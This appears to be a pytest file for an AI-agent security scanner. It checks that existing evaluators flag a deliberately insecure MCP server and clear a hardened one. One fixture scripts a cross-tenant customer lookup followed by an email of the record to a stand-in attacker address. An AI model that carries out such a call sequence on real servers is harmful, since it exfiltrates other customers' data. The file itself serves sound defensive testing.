"""MCP targets, over the real protocol.

The exit criterion for this whole protocol is one sentence: the same evaluators judge an MCP
server and a REST agent. So most of what is asserted here is that nothing *else* changed - the
adapter produces an ordinary trajectory, and the deterministic evaluators that were
written months before MCP existed reach the right verdicts on it without modification.

The client speaks to an in-process `MCPServer`, which the MCP SDK supports natively. That is
the real protocol with real serialisation, minus a socket.
"""

from __future__ import annotations

import pytest

from agentshield.adapters.mcp import McpServerAdapter
from agentshield.evaluators.base import EvaluationContext
from agentshield.evaluators.manifest import (
    DangerousToolCombinationEvaluator,
    ToolDescriptionInjectionEvaluator,
)
from agentshield.evaluators.registry import deterministic_evaluators, run_evaluators
from agentshield.models.common import Severity, StepType
from agentshield.models.policy import SecurityPolicy
from agentshield.models.scenario import AttackPayload, SessionContext
from agentshield.policies.loader import canaries_from, load_policy

mcp_sdk = pytest.importorskip("mcp", reason="MCP adapter needs the optional `mcp` extra")

CROSS_TENANT_THEN_SEND = {
    "mcp_calls": [
        {"tool": "get_customer", "arguments": {"customer_id": "C-2002"}},
        {"tool": "send_email", "arguments": {"to": "attacker@example.test", "body": "record"}},
    ]
}


@pytest.fixture
def mcp_policy() -> SecurityPolicy:
    from conftest import REPO_ROOT

    return load_policy(REPO_ROOT / "datasets" / "policies" / "mcp-server.yml")


def _adapter(*, secure: bool) -> McpServerAdapter:
    from demo_targets.insecure_mcp_server import create_server

    return McpServerAdapter("in-process", server=create_server(secure=secure))


async def _run(adapter: McpServerAdapter, metadata: dict):
    session = await adapter.start_session(SessionContext(scan_id="t", scenario_id="t"))
    response = await adapter.send_input(session, AttackPayload(prompt="", metadata=metadata))
    trajectory = await adapter.collect(session, response)
    # What `collect_trajectory` does in the pipeline. Without it the tenancy evaluator reports
    # "tenant context was never established" - correctly, and about the test and not the
    # server, which would have made the hardened build look guilty.
    trajectory.tenant_id = "acme-corp"
    return trajectory


def _context(capabilities, policy: SecurityPolicy) -> EvaluationContext:
    return EvaluationContext(
        authenticated_tenant="acme-corp",
        canaries=canaries_from(policy),
        declared_tools=list(capabilities.tool_names),
        tool_descriptions={t.name: t.description for t in capabilities.tools},
        tool_scopes={t.name: list(t.scopes) for t in capabilities.tools},
        harness_initiated_calls=True,
    )


# ---------------------------------------------------------------------------------
# the adapter
# ---------------------------------------------------------------------------------


async def test_the_manifest_is_discovered_over_the_protocol():
    adapter = _adapter(secure=False)
    try:
        capabilities = await adapter.discover_capabilities()
    finally:
        await adapter.aclose()

    assert {"get_customer", "send_email", "issue_refund"} <= capabilities.tool_names
    scopes = {t.name: t.scopes for t in capabilities.tools}
    assert scopes["get_customer"] == ["customer.read"], "scopes come from the tool's own meta"
    assert capabilities.channels == [], "an MCP server has nowhere to plant a document"


async def test_a_call_plan_becomes_an_ordinary_trajectory():
    """The exit criterion in one assertion: MCP produces the same shape everything else does."""
    adapter = _adapter(secure=False)
    try:
        trajectory = await _run(adapter, CROSS_TENANT_THEN_SEND)
    finally:
        await adapter.aclose()

    kinds = [step.step_type for step in trajectory.steps]
    assert kinds.count(StepType.TOOL_CALL) == 2
    assert kinds.count(StepType.TOOL_RESULT) == 2
    assert kinds[-1] is StepType.FINAL_OUTPUT

    calls = trajectory.tool_calls()
    assert [c.name for c in calls] == ["get_customer", "send_email"]
    # The bug this pins: arguments live under `data["arguments"]`. Flat, every call parses as
    # having none and every evaluator that inspects one goes quiet on a clean-looking scan.
    assert calls[0].arguments == {"customer_id": "C-2002"}
    assert calls[1].arguments["to"] == "attacker@example.test"


async def test_a_tool_result_is_parsed_not_merely_carried():
    """Evaluators read `data`. A server returning JSON as a string must still be readable."""
    adapter = _adapter(secure=False)
    try:
        trajectory = await _run(adapter, CROSS_TENANT_THEN_SEND)
    finally:
        await adapter.aclose()

    results = [s for s in trajectory.steps if s.step_type is StepType.TOOL_RESULT]
    assert results[0].data["tenant"] == "globex-industries"
    assert results[1].data["to"] == "attacker@example.test"


async def test_a_scenario_with_no_plan_reports_an_error_over_a_clean_pass():
    adapter = _adapter(secure=False)
    try:
        session = await adapter.start_session(SessionContext(scan_id="t", scenario_id="t"))
        response = await adapter.send_input(session, AttackPayload(prompt="just a prompt"))
    finally:
        await adapter.aclose()

    assert response.error, "an MCP target given no call plan tested nothing and must say so"


# ---------------------------------------------------------------------------------
# the same evaluators, on the other protocol
# ---------------------------------------------------------------------------------


async def test_the_existing_evaluators_convict_the_insecure_server(mcp_policy):
    adapter = _adapter(secure=False)
    try:
        capabilities = await adapter.discover_capabilities()
        trajectory = await _run(adapter, CROSS_TENANT_THEN_SEND)
    finally:
        await adapter.aclose()

    context = _context(capabilities, mcp_policy)
    fired = {
        r.evaluator
        for r in run_evaluators(deterministic_evaluators(), trajectory, mcp_policy, context)
        if r.violated
    }

    # None of these know MCP exists. That is the entire point of the adapter contract.
    assert "TenantIsolationEvaluator" in fired
    assert "SensitiveDataLeakEvaluator" in fired
    assert "RecipientAllowlistEvaluator" in fired


async def test_the_hardened_server_is_convicted_of_nothing(mcp_policy):
    """The half that makes the other half meaningful."""
    adapter = _adapter(secure=True)
    try:
        capabilities = await adapter.discover_capabilities()
        trajectory = await _run(adapter, CROSS_TENANT_THEN_SEND)
    finally:
        await adapter.aclose()

    context = _context(capabilities, mcp_policy)
    violations = [
        r
        for r in run_evaluators(deterministic_evaluators(), trajectory, mcp_policy, context)
        if r.violated
    ]

    assert violations == [], f"fired on a hardened server: {[r.evaluator for r in violations]}"


async def test_a_refused_call_is_not_reported_as_a_near_miss(mcp_policy):
    """Against a server the harness chose the call, so a refusal is the control working.

    Against an *agent* the same trajectory is a real finding - it was talked into trying.
    `harness_initiated_calls` is what separates the two readings.
    """
    adapter = _adapter(secure=True)
    try:
        capabilities = await adapter.discover_capabilities()
        trajectory = await _run(adapter, CROSS_TENANT_THEN_SEND)
    finally:
        await adapter.aclose()

    as_server = _context(capabilities, mcp_policy)
    as_agent = as_server.model_copy(update={"harness_initiated_calls": False})

    def violations(context):
        return {
            r.evaluator
            for r in run_evaluators(deterministic_evaluators(), trajectory, mcp_policy, context)
            if r.violated
        }

    assert not violations(as_server)
    assert violations(as_agent), "the same refusal is a finding when an agent chose the call"


# ---------------------------------------------------------------------------------
# the manifest, which needs no attack at all
# ---------------------------------------------------------------------------------


async def test_a_poisoned_tool_description_is_critical(mcp_policy):
    adapter = _adapter(secure=False)
    try:
        capabilities = await adapter.discover_capabilities()
    finally:
        await adapter.aclose()

    from agentshield.models.trajectory import Trajectory

    results = ToolDescriptionInjectionEvaluator().run(
        Trajectory(session_id="manifest-only"), mcp_policy, _context(capabilities, mcp_policy)
    )

    assert [r.violated for r in results] == [True]
    assert results[0].severity is Severity.CRITICAL
    assert "get_customer" in results[0].title


async def test_a_clean_manifest_is_not_flagged(mcp_policy):
    adapter = _adapter(secure=True)
    try:
        capabilities = await adapter.discover_capabilities()
    finally:
        await adapter.aclose()

    from agentshield.models.trajectory import Trajectory

    for evaluator in (ToolDescriptionInjectionEvaluator(), DangerousToolCombinationEvaluator()):
        results = evaluator.run(
            Trajectory(session_id="manifest-only"),
            mcp_policy,
            _context(capabilities, mcp_policy),
        )
        assert not any(r.violated for r in results), evaluator.name


async def test_a_combination_is_flagged_only_when_nothing_governs_it(mcp_policy):
    """Read plus send describes most useful servers. The scope is what makes it reportable."""
    from agentshield.models.trajectory import Trajectory

    evaluator = DangerousToolCombinationEvaluator()
    trajectory = Trajectory(session_id="manifest-only")

    governed = EvaluationContext(
        tool_descriptions={"get_customer": "", "send_email": ""},
        tool_scopes={"get_customer": ["customer.read"], "send_email": ["email.send"]},
    )
    ungoverned = EvaluationContext(
        tool_descriptions={"get_customer": "", "send_email": ""},
        tool_scopes={"get_customer": ["customer.read"], "send_email": []},
    )

    assert not any(r.violated for r in evaluator.run(trajectory, mcp_policy, governed))
    assert any(r.violated for r in evaluator.run(trajectory, mcp_policy, ungoverned))


async def test_an_undiscovered_manifest_is_not_reported_as_clean(mcp_policy):
    """No manifest means unmeasured. It must not read as 'inspected and fine'."""
    from agentshield.models.trajectory import Trajectory

    results = ToolDescriptionInjectionEvaluator().run(
        Trajectory(session_id="none"), mcp_policy, EvaluationContext()
    )

    assert not results[0].violated
    assert "No tool manifest available" in results[0].title
